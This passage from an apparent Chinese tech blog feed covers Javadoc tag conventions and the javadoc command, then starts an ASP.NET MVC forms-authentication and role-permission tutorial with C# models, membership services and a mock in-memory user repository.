<h3 id="对多个相同-tags-的排序"><a href="#对多个相同-tags-的排序" class="headerlink" title="对多个相同 tags 的排序"></a>对多个相同 tags 的排序</h3><p>按照下面的惯例来使用多个相同 tags。如果需要，可以用空白行（单*）来隔离这些包含多个相同 tags 的组。</p>
<ul>
<li>多个**<a href="/author">@author </a> **标签，应该按照发生时间顺序排列，最早的发在最上面。</li>
<li>多个**<a href="/param">@param </a> **标签，应该按照参数的声明顺序排列。</li>
<li>多个**<a href="/throws">@throws </a> <strong>标签（或</strong><a href="/exception">@exception </a> **），应该按照异常名称的字母顺序排列。</li>
</ul>
<h3 id="必须的-Tags"><a href="#必须的-Tags" class="headerlink" title="必须的 Tags"></a>必须的 Tags</h3><p>按照惯例，每一个参数都应该有一个**<a href="/param">@param </a> <strong>标签，即使描述很明显。每一个返回不是<em>void</em>的方法都应该有一个</strong><a href="/return">@return </a> **标签，即使这个标签和方法的描述内容重复。</p>
<p>参考资料</p>
<p><a href="https://link.jianshu.com/?t=http://www.oracle.com/technetwork/java/javase/tech/index-137868.html">How to Write Doc Comments for the Javadoc Tool</a></p>
<p>菜鸟：<a href="https://www.runoob.com/java/java9-improved-javadocs.html">Java 9 改进 Javadoc</a></p>
<p>菜鸟：<a href="https://www.runoob.com/java/java-documentation.html">Java 文档注释</a></p>
<h1 id="二、javadoc-命令生成-api-文档"><a href="#二、javadoc-命令生成-api-文档" class="headerlink" title="二、javadoc 命令生成 api 文档"></a>二、javadoc 命令生成 api 文档</h1><h2 id="百度经验的生成："><a href="#百度经验的生成：" class="headerlink" title="百度经验的生成："></a>百度经验的生成：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">javadoc -d javaapi -header 测试的API -doctitle 这是我的第一个文档注释 -version -author javadoc/Hello.java 进行文档生成。</span><br></pre></td></tr></table></figure>

<h2 id="我的：对-Main-java-生成-Api-文档："><a href="#我的：对-Main-java-生成-Api-文档：" class="headerlink" title="我的：对 Main.java 生成 Api 文档："></a>我的：对 Main.java 生成 Api 文档：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">javadoc -d javaapi -header test -doctitle test1 -version -author Main.java</span><br></pre></td></tr></table></figure>

<p><strong>-d:文件存储位置;</strong></p>
<p>**-head:文件头部名称; **</p>
<p><strong>-version:显示版本;</strong></p>
<p><strong>-author:显示作者;</strong></p>
<p><strong>-javadoc&#x2F;Hello.java 处理的文件包以及 java 源文件.*</strong></p>
<h2 id="查看生成的-api-文件"><a href="#查看生成的-api-文件" class="headerlink" title="查看生成的 api 文件"></a>查看生成的 api 文件</h2><p>创建成功之后，就会自动创建指定的文件夹下生成 api 文件。打开 index.html 就是 api 文件的入口，可查看自己编写的代码生成的 api 文档。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>NET MVC身份验证及权限管理</title>
    <url>/2021/05/15/NET%20MVC%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E5%8F%8A%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1 id="一、项目结构"><a href="#一、项目结构" class="headerlink" title="一、项目结构"></a>一、项目结构</h1><p><a href="https://blog.csdn.net/YUEXILIULI/article/details/106052275">https://blog.csdn.net/YUEXILIULI/article/details/106052275</a></p>
<h1 id="二、编写代码"><a href="#二、编写代码" class="headerlink" title="二、编写代码"></a>二、编写代码</h1><h2 id="（1）创建实体类"><a href="#（1）创建实体类" class="headerlink" title="（1）创建实体类"></a>（1）创建实体类</h2><h3 id="AccountModels-cs"><a href="#AccountModels-cs" class="headerlink" title="AccountModels .cs"></a>AccountModels .cs</h3><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">WebApplication1.Models</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">region</span> Models</span></span><br><span class="line">    [<span class="meta">PropertiesMustMatch(<span class="string">&quot;NewPassword&quot;</span>, <span class="string">&quot;ConfirmPassword&quot;</span>, ErrorMessage = <span class="string">&quot;The new password and confirmation password do not match.&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ChangePasswordModel</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">Required</span>]</span><br><span class="line">        [<span class="meta">DataType(DataType.Password)</span>]</span><br><span class="line">        [<span class="meta">DisplayName(<span class="string">&quot;Current password&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> OldPassword &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">Required</span>]</span><br><span class="line">        [<span class="meta">ValidatePasswordLength</span>]</span><br><span class="line">        [<span class="meta">DataType(DataType.Password)</span>]</span><br><span class="line">        [<span class="meta">DisplayName(<span class="string">&quot;New password&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> NewPassword &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">Required</span>]</span><br><span class="line">        [<span class="meta">DataType(DataType.Password)</span>]</span><br><span class="line">        [<span class="meta">DisplayName(<span class="string">&quot;Confirm new password&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> ConfirmPassword &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">LogOnModel</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">Required</span>]</span><br><span class="line">        [<span class="meta">DisplayName(<span class="string">&quot;User name&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> UserName &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">Required</span>]</span><br><span class="line">        [<span class="meta">DataType(DataType.Password)</span>]</span><br><span class="line">        [<span class="meta">DisplayName(<span class="string">&quot;Password&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Password &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">DisplayName(<span class="string">&quot;Remember me?&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">bool</span> RememberMe &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">PropertiesMustMatch(<span class="string">&quot;Password&quot;</span>, <span class="string">&quot;ConfirmPassword&quot;</span>, ErrorMessage = <span class="string">&quot;The password and confirmation password do not match.&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">RegisterModel</span></span><br><span class="line">    &#123;</span><br><span class="line">        [<span class="meta">Required</span>]</span><br><span class="line">        [<span class="meta">DisplayName(<span class="string">&quot;User name&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> UserName &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">Required</span>]</span><br><span class="line">        [<span class="meta">DataType(DataType.EmailAddress)</span>]</span><br><span class="line">        [<span class="meta">DisplayName(<span class="string">&quot;Email address&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Email &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">Required</span>]</span><br><span class="line">        [<span class="meta">ValidatePasswordLength</span>]</span><br><span class="line">        [<span class="meta">DataType(DataType.Password)</span>]</span><br><span class="line">        [<span class="meta">DisplayName(<span class="string">&quot;Password&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Password &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">        [<span class="meta">Required</span>]</span><br><span class="line">        [<span class="meta">DataType(DataType.Password)</span>]</span><br><span class="line">        [<span class="meta">DisplayName(<span class="string">&quot;Confirm password&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> ConfirmPassword &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#<span class="keyword">endregion</span></span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">region</span> Services</span></span><br><span class="line">    <span class="comment">// The FormsAuthentication type is sealed and contains static members, so it is difficult to</span></span><br><span class="line">    <span class="comment">// unit test code that calls its members. The interface and helper class below demonstrate</span></span><br><span class="line">    <span class="comment">// how to create an abstract wrapper around such a type in order to make the AccountController</span></span><br><span class="line">    <span class="comment">// code unit testable.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">IMembershipService</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">int</span> MinPasswordLength &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="built_in">bool</span> <span class="title">ValidateUser</span>(<span class="params"><span class="built_in">string</span> userName, <span class="built_in">string</span> password</span>)</span>;</span><br><span class="line">        <span class="function">MembershipCreateStatus <span class="title">CreateUser</span>(<span class="params"><span class="built_in">string</span> userName, <span class="built_in">string</span> password, <span class="built_in">string</span> email</span>)</span>;</span><br><span class="line">        <span class="function"><span class="built_in">bool</span> <span class="title">ChangePassword</span>(<span class="params"><span class="built_in">string</span> userName, <span class="built_in">string</span> oldPassword, <span class="built_in">string</span> newPassword</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">AccountMembershipService</span> : <span class="title">IMembershipService</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">readonly</span> MembershipProvider _provider;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">AccountMembershipService</span>()</span></span><br><span class="line"><span class="function">            : <span class="title">this</span>(<span class="params"><span class="literal">null</span></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">AccountMembershipService</span>(<span class="params">MembershipProvider provider</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _provider = provider ?? Membership.Provider;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> MinPasswordLength</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">get</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> _provider.MinRequiredPasswordLength;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">bool</span> <span class="title">ValidateUser</span>(<span class="params"><span class="built_in">string</span> userName, <span class="built_in">string</span> password</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (String.IsNullOrEmpty(userName)) <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException(<span class="string">&quot;Value cannot be null or empty.&quot;</span>, <span class="string">&quot;userName&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (String.IsNullOrEmpty(password)) <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException(<span class="string">&quot;Value cannot be null or empty.&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> _provider.ValidateUser(userName, password);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> MembershipCreateStatus <span class="title">CreateUser</span>(<span class="params"><span class="built_in">string</span> userName, <span class="built_in">string</span> password, <span class="built_in">string</span> email</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (String.IsNullOrEmpty(userName)) <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException(<span class="string">&quot;Value cannot be null or empty.&quot;</span>, <span class="string">&quot;userName&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (String.IsNullOrEmpty(password)) <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException(<span class="string">&quot;Value cannot be null or empty.&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (String.IsNullOrEmpty(email)) <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException(<span class="string">&quot;Value cannot be null or empty.&quot;</span>, <span class="string">&quot;email&quot;</span>);</span><br><span class="line"></span><br><span class="line">            MembershipCreateStatus status;</span><br><span class="line">            _provider.CreateUser(userName, password, email, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">true</span>, <span class="literal">null</span>, <span class="keyword">out</span> status);</span><br><span class="line">            <span class="keyword">return</span> status;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">bool</span> <span class="title">ChangePassword</span>(<span class="params"><span class="built_in">string</span> userName, <span class="built_in">string</span> oldPassword, <span class="built_in">string</span> newPassword</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (String.IsNullOrEmpty(userName)) <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException(<span class="string">&quot;Value cannot be null or empty.&quot;</span>, <span class="string">&quot;userName&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (String.IsNullOrEmpty(oldPassword)) <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException(<span class="string">&quot;Value cannot be null or empty.&quot;</span>, <span class="string">&quot;oldPassword&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (String.IsNullOrEmpty(newPassword)) <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException(<span class="string">&quot;Value cannot be null or empty.&quot;</span>, <span class="string">&quot;newPassword&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The underlying ChangePassword() will throw an exception rather</span></span><br><span class="line">            <span class="comment">// than return false in certain failure scenarios.</span></span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                MembershipUser currentUser = _provider.GetUser(userName, <span class="literal">true</span> <span class="comment">/* userIsOnline */</span>);</span><br><span class="line">                <span class="keyword">return</span> currentUser.ChangePassword(oldPassword, newPassword);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (ArgumentException)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (MembershipPasswordException)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">IFormsAuthenticationService</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">SignIn</span>(<span class="params"><span class="built_in">string</span> userName, <span class="built_in">bool</span> createPersistentCookie</span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">SignOut</span>()</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">FormsAuthenticationService</span> : <span class="title">IFormsAuthenticationService</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SignIn</span>(<span class="params"><span class="built_in">string</span> userName, <span class="built_in">bool</span> createPersistentCookie</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (String.IsNullOrEmpty(userName)) <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentException(<span class="string">&quot;Value cannot be null or empty.&quot;</span>, <span class="string">&quot;userName&quot;</span>);</span><br><span class="line"></span><br><span class="line">            FormsAuthentication.SetAuthCookie(userName, createPersistentCookie);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SignOut</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            FormsAuthentication.SignOut();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#<span class="keyword">endregion</span></span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">region</span> Validation</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">AccountValidation</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">ErrorCodeToString</span>(<span class="params">MembershipCreateStatus createStatus</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// See http://go.microsoft.com/fwlink/?LinkID=177550 for</span></span><br><span class="line">            <span class="comment">// a full list of status codes.</span></span><br><span class="line">            <span class="keyword">switch</span> (createStatus)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">case</span> MembershipCreateStatus.DuplicateUserName:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Username already exists. Please enter a different user name.&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> MembershipCreateStatus.DuplicateEmail:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;A username for that e-mail address already exists. Please enter a different e-mail address.&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> MembershipCreateStatus.InvalidPassword:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;The password provided is invalid. Please enter a valid password value.&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> MembershipCreateStatus.InvalidEmail:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;The e-mail address provided is invalid. Please check the value and try again.&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> MembershipCreateStatus.InvalidAnswer:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;The password retrieval answer provided is invalid. Please check the value and try again.&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> MembershipCreateStatus.InvalidQuestion:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;The password retrieval question provided is invalid. Please check the value and try again.&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> MembershipCreateStatus.InvalidUserName:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;The user name provided is invalid. Please check the value and try again.&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> MembershipCreateStatus.ProviderError:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;The authentication provider returned an error. Please verify your entry and try again. If the problem persists, please contact your system administrator.&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> MembershipCreateStatus.UserRejected:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;The user creation request has been canceled. Please verify your entry and try again. If the problem persists, please contact your system administrator.&quot;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="literal">default</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;An unknown error occurred. Please verify your entry and try again. If the problem persists, please contact your system administrator.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">AttributeUsage(AttributeTargets.Class, AllowMultiple = true, Inherited = true)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">PropertiesMustMatchAttribute</span> : <span class="title">ValidationAttribute</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">const</span> <span class="built_in">string</span> _defaultErrorMessage = <span class="string">&quot;&#x27;&#123;0&#125;&#x27; and &#x27;&#123;1&#125;&#x27; do not match.&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">readonly</span> <span class="built_in">object</span> _typeId = <span class="keyword">new</span> <span class="built_in">object</span>();</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">PropertiesMustMatchAttribute</span>(<span class="params"><span class="built_in">string</span> originalProperty, <span class="built_in">string</span> confirmProperty</span>)</span></span><br><span class="line"><span class="function">            : <span class="title">base</span>(<span class="params">_defaultErrorMessage</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            OriginalProperty = originalProperty;</span><br><span class="line">            ConfirmProperty = confirmProperty;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> ConfirmProperty &#123; <span class="keyword">get</span>; <span class="keyword">private</span> <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> OriginalProperty &#123; <span class="keyword">get</span>; <span class="keyword">private</span> <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">object</span> TypeId</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">get</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> _typeId;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">string</span> <span class="title">FormatErrorMessage</span>(<span class="params"><span class="built_in">string</span> name</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> String.Format(CultureInfo.CurrentUICulture, ErrorMessageString,</span><br><span class="line">                OriginalProperty, ConfirmProperty);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">bool</span> <span class="title">IsValid</span>(<span class="params"><span class="built_in">object</span> <span class="keyword">value</span></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            PropertyDescriptorCollection properties = TypeDescriptor.GetProperties(<span class="keyword">value</span>);</span><br><span class="line">            <span class="built_in">object</span> originalValue = properties.Find(OriginalProperty, <span class="literal">true</span> <span class="comment">/* ignoreCase */</span>).GetValue(<span class="keyword">value</span>);</span><br><span class="line">            <span class="built_in">object</span> confirmValue = properties.Find(ConfirmProperty, <span class="literal">true</span> <span class="comment">/* ignoreCase */</span>).GetValue(<span class="keyword">value</span>);</span><br><span class="line">            <span class="keyword">return</span> Object.Equals(originalValue, confirmValue);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">AttributeUsage(AttributeTargets.Field | AttributeTargets.Property, AllowMultiple = false, Inherited = true)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">ValidatePasswordLengthAttribute</span> : <span class="title">ValidationAttribute</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">const</span> <span class="built_in">string</span> _defaultErrorMessage = <span class="string">&quot;&#x27;&#123;0&#125;&#x27; must be at least &#123;1&#125; characters long.&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">readonly</span> <span class="built_in">int</span> _minCharacters = Membership.Provider.MinRequiredPasswordLength;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">ValidatePasswordLengthAttribute</span>()</span></span><br><span class="line"><span class="function">            : <span class="title">base</span>(<span class="params">_defaultErrorMessage</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">string</span> <span class="title">FormatErrorMessage</span>(<span class="params"><span class="built_in">string</span> name</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> String.Format(CultureInfo.CurrentUICulture, ErrorMessageString,</span><br><span class="line">                name, _minCharacters);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">bool</span> <span class="title">IsValid</span>(<span class="params"><span class="built_in">object</span> <span class="keyword">value</span></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> valueAsString = <span class="keyword">value</span> <span class="keyword">as</span> <span class="built_in">string</span>;</span><br><span class="line">            <span class="keyword">return</span> (valueAsString != <span class="literal">null</span> &amp;&amp; valueAsString.Length &gt;= _minCharacters);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#<span class="keyword">endregion</span></span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">WebApplication1.Models</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">User</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> ID &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Password &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span>[] Roles &#123; <span class="keyword">get</span>; <span class="keyword">set</span>;  &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="（2）Repository-对数据进行操作"><a href="#（2）Repository-对数据进行操作" class="headerlink" title="（2）Repository:对数据进行操作"></a>（2）Repository:对数据进行操作</h2><h3 id="UserRepository-cs"><a href="#UserRepository-cs" class="headerlink" title="UserRepository.cs"></a>UserRepository.cs</h3><p>没有把数据放在数据库中，这里采用模拟数据的方式。</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">WebApplication1.Repositoty</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UserRepository</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> User[] usersForTest = <span class="keyword">new</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> User&#123; ID = <span class="number">1</span>, Name = <span class="string">&quot;bob&quot;</span>, Password = <span class="string">&quot;bob&quot;</span>, Roles = <span class="keyword">new</span> []&#123;<span class="string">&quot;employee&quot;</span>&#125;&#125;,</span><br><span class="line">        <span class="keyword">new</span> User&#123; ID = <span class="number">2</span>, Name = <span class="string">&quot;tom&quot;</span>, Password = <span class="string">&quot;tom&quot;</span>, Roles = <span class="keyword">new</span> []&#123;<span class="string">&quot;manager&quot;</span>&#125;&#125;,</span><br><span class="line">        <span class="keyword">new</span> User&#123; ID = <span class="number">3</span>, Name = <span class="string">&quot;admin&quot;</span>, Password = <span class="string">&quot;admin&quot;</span>, Roles = <span class="keyword">new</span>[]&#123;<span class="string">&quot;admin&quot;</span>&#125;&#125;,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">bool</span> <span class="title">ValidateUser</span>(<span class="params"><span class="built_in">string</span> userName, <span class="built_in">string</span> password</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> usersForTest</span><br><span class="line">                .Any(u =&gt; u.Name == userName &amp;&amp; u.Password == password);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">string</span>[] <span class="title">GetRoles</span>(<span class="params"><span class="built_in">string</span> userName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> usersForTest</span><br><span class="line">                .Where(u =&gt; u.Name == userName)</span><br><span class="line">                .Select(u =&gt; u.Roles)</span><br><span class="line">                .FirstOrDefault();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> User <span class="title">GetByNameAndPassword</span>(<span class="params"><span class="built_in">string</span> name, <span class="built_in">string</span> password</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> usersForTest</span><br><span class="line">                .FirstOrDefault(u =&gt; u.Name == name &amp;&amp; u.Password == password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="（3）配置-Web-config"><a href="#（3）配置-Web-config" class="headerlink" title="（3）配置 Web.config"></a>（3）配置 Web.config</h2><p>在 web.config 文件中，</p>
<p>&lt;system.web&gt;配置节用于对验证进行配置。</p>
<p>为节点提供 mode&#x3D;”Forms”属性</p>
